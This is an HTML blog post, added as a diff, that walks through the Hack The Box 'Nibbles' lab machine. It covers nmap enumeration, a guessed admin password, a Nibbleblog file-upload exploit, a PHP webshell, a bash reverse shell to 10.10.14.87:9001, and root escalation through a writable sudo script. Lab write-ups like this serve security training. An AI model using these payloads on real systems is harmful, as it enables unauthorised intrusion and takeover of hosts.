@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Nibbles | 0xW1LD</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Nibbles" />
+<meta name="author" content="0xW1LD" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Information Gathering Enumeration nmap found the following ports open:" />
+<meta property="og:description" content="Information Gathering Enumeration nmap found the following ports open:" />
+<link rel="canonical" href="http://localhost:4000/htb/2025/02/14/Nibbles.html" />
+<meta property="og:url" content="http://localhost:4000/htb/2025/02/14/Nibbles.html" />
+<meta property="og:site_name" content="0xW1LD" />
+<meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/344a8f99e8f7dddfed764f791e2731df.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-02-14T00:00:00+11:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://labs.hackthebox.com/storage/avatars/344a8f99e8f7dddfed764f791e2731df.png" />
+<meta property="twitter:title" content="Nibbles" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0xW1LD"},"dateModified":"2025-02-14T00:00:00+11:00","datePublished":"2025-02-14T00:00:00+11:00","description":"Information Gathering Enumeration nmap found the following ports open:","headline":"Nibbles","image":"https://labs.hackthebox.com/storage/avatars/344a8f99e8f7dddfed764f791e2731df.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/2025/02/14/Nibbles.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"0xW1LD"},"url":"http://localhost:4000/htb/2025/02/14/Nibbles.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+<!-- You can set your favicon here -->
+<link rel="icon" href="/favicon.ico">
+
+<!-- end custom head snippets -->
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/">0xW1LD</a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p>Just some 0xW1LD stuff...</p>
+
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <small>14 February 2025</small>
+<h1>Nibbles</h1>
+
+<p class="view">by 0xW1LD</p>
+
+<p><img src="https://labs.hackthebox.com/storage/avatars/344a8f99e8f7dddfed764f791e2731df.png" alt="nibbles" /></p>
+<h1 id="information-gathering">Information Gathering</h1>
+<h2 id="enumeration">Enumeration</h2>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found the following ports open:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+<p>A detailed script+service scan reveals the following information:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
+|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods:
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="http">HTTP</h2>
+<p>Running on port <code class="language-plaintext highlighter-rouge">80</code> is an <code class="language-plaintext highlighter-rouge">http</code> website running <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.18</code>:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213170012.png" alt="Pasted image 20250213170012.png" /><br />
+Viewing the page source reveals something interesting:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;b&gt;</span>Hello world!<span class="nt">&lt;/b&gt;</span>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<span class="c">&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;</span>
+</code></pre></div></div>
+<p>Navigating to that directory we find the following homepage:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213170207.png" alt="Pasted image 20250213170207.png" />
+A directory scan on the webroot found these directories:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.200.170/FUZZ
+ :: Wordlist         : FUZZ: /opt/seclists/737/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 290ms]
+.hta                    [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 2518ms]
+.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 4711ms]
+index.html              [Status: 200, Size: 93, Words: 8, Lines: 17, Duration: 305ms]
+server-status           [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 287ms]
+:: Progress: [4739/4739] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
+</code></pre></div></div>
+<p>Nothing quite so interesting as they’re all forbidden aside from <code class="language-plaintext highlighter-rouge">index.html</code><br />
+A directory scan on the <code class="language-plaintext highlighter-rouge">nibbleblog</code> directory found:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/.hta                 (Status: 403) [Size: 304]
+/.htpasswd            (Status: 403) [Size: 309]
+/.htaccess            (Status: 403) [Size: 309]
+/README               (Status: 200) [Size: 4628]
+/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.200.170/nibbleblog/admin/]
+/admin.php            (Status: 200) [Size: 1401]
+/content              (Status: 301) [Size: 329] [--&gt; http://10.129.200.170/nibbleblog/content/]
+/index.php            (Status: 200) [Size: 2987]
+/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.200.170/nibbleblog/languages/]
+/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.200.170/nibbleblog/plugins/]
+/themes               (Status: 301) [Size: 328] [--&gt; http://10.129.200.170/nibbleblog/themes/]
+</code></pre></div></div>
+<p>We have found a login page: <code class="language-plaintext highlighter-rouge">/nibbleblog/admin.php</code>:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213175925.png" alt="Pasted image 20250213175925.png" />
+Looking through the rest of the files we find <code class="language-plaintext highlighter-rouge">users.xml</code> which confirmed the username <code class="language-plaintext highlighter-rouge">admin</code> and some sort of blacklist which occurs when more than 5 incorrect login attempts are made:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250214173423.png" alt="Pasted image 20250214173423.png" />
+Another file is <code class="language-plaintext highlighter-rouge">README</code> which contains the <code class="language-plaintext highlighter-rouge">nibbleblog</code> version: <code class="language-plaintext highlighter-rouge">v4.0.3</code>
+Attempting to login guessing <code class="language-plaintext highlighter-rouge">nibbles</code> as the password works!
+After loging in we reach an admin dashboard:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213180044.png" alt="Pasted image 20250213180044.png" />
+Viewing the <code class="language-plaintext highlighter-rouge">plugins</code> we find a <code class="language-plaintext highlighter-rouge">my image</code> plugin, which on initial testing is vulnerable to an arbitrary file upload.</p>
+<h1 id="vulnerability-assessment">Vulnerability Assessment</h1>
+<h2 id="nibbleblog-file-upload-vulnerability">Nibbleblog File Upload Vulnerability</h2>
+<ul>
+  <li>url: https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/
+The current enumerated version <code class="language-plaintext highlighter-rouge">v4.0.3</code> is known to be vulnerable to the exploit.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>| Category   | Score |
+| ---------- | ----- |
+| Success    | 10    |
+| Complexity | 5     |
+| Damage     | -0    |
+| Total      | 15    |
+</code></pre></div></div>
+
+<h1 id="exploitation">Exploitation</h1>
+<p>Uploading the following PoC using the <code class="language-plaintext highlighter-rouge">my image</code> plugin:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>Leads to the following errors being shown:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
+
+Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27
+
+Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117
+
+Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118
+
+Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43
+
+Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
+</code></pre></div></div>
+
+<p>Ignoring these and checking back on the homepage of the blog we can see the image title and caption for the image we uploaded:<br />
+<img src="/assets/img/2025-02-14-Nibbles/Pasted image 20250213181150.png" alt="Pasted image 20250213181150.png" />
+opening the image in a new tab redirects to the following directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.jpg
+</code></pre></div></div>
+
+<p>if we replace <code class="language-plaintext highlighter-rouge">.jpg</code> with <code class="language-plaintext highlighter-rouge">.php?cmd=id</code> we get the following response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+</code></pre></div></div>
+
+<p>Success! we have a <code class="language-plaintext highlighter-rouge">WebShell!</code>
+Uploading the following <code class="language-plaintext highlighter-rouge">PoC</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.87/9001 0&gt;&amp;1'"</span><span class="p">)</span><span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Starting a listener:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9001
+</code></pre></div></div>
+
+<p>And then browsing to the shell location:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
+</code></pre></div></div>
+
+<p>Leads to a <code class="language-plaintext highlighter-rouge">RevShell</code>!:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.129.200.170 34030
+bash: cannot set terminal process group (1257): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
+</code></pre></div></div>
+
+<h1 id="post-exploitation">Post Exploitation</h1>
+<p>Looking around in our shell we find that we can run the following sudo command with no password:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</code></pre></div></div>
+
+<p>Seeing as we have write permissions in the home directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
+total 24
+drwxr-xr-x 4 nibbler nibbler 4096 Feb 14 01:11 .
+drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
+-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
+drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
+drwxr-xr-x 3 nibbler nibbler 4096 Feb 14 01:11 personal
+-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
+-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
+</code></pre></div></div>
+<p>We can create a file called <code class="language-plaintext highlighter-rouge">monitor.sh</code> in <code class="language-plaintext highlighter-rouge">~/personal/stuff</code> with the following contents:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash
+</code></pre></div></div>
+
+<p>We then set the file to be executable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x monitor.sh
+</code></pre></div></div>
+
+<p>and when we execute it as <code class="language-plaintext highlighter-rouge">sudo</code> we get a root shell!:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ./monitor.sh
+root@Nibbles:/home/nibbler/personal/stuff#
+</code></pre></div></div>
+
+
+
+  <small>tags: <em>diff/easy</em> - <em>os/linux</em></small>
+
+
+      </section>
+      <footer>
+        
+        <p><small>Powered by my one brain cell</small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
